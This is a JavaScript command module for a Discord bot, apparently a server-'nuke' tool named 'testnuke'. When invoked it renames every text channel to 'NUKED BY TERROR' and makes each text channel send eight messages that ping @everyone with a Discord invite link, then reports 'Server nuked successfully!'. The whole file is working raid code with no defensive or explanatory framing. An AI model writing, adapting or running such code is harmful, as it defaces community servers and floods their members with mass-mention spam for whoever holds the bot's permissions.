const { SlashCommandBuilder } = require('discord.js');

module.exports = {
  data: new SlashCommandBuilder()
    .setName('testnuke')
    .setDescription('Nukes the server.'),

  async execute(interaction) {
    try {
      // Update channel names
      await interaction.guild.channels.cache.forEach(async (channel) => {
        if (channel.type === 'GUILD_TEXT') {
          await channel.setName('NUKED BY TERROR');
        }
      });

      // Get the @everyone mention
      const everyoneMention = interaction.guild.roles.everyone.toString();

      // Send nuke messages in each channel with a delay of 1000ms (1 second)
      const channels = interaction.guild.channels.cache.filter(channel => channel.type === 'GUILD_TEXT');
      const messagePromises = [];

      channels.forEach((channel) => {
        for (let i = 0; i < 8; i++) {
          const message = `${everyoneMention} NUKED BY TERROR! Join the chaos: https://discord.gg/tdZ7exY75K`;

          // Delay the message sending
          const delay = i * 1000;
          const sendPromise = new Promise((resolve) => {
            setTimeout(() => {
              channel.send(message);
              resolve();
            }, delay);
          });

          messagePromises.push(sendPromise);
        }
      });

      await Promise.all(messagePromises);

      await interaction.reply('Server nuked successfully!');
    } catch (error) {
      console.error(error);
      await interaction.reply('Failed to nuke the server. Please try again later.');
    }
  },
};


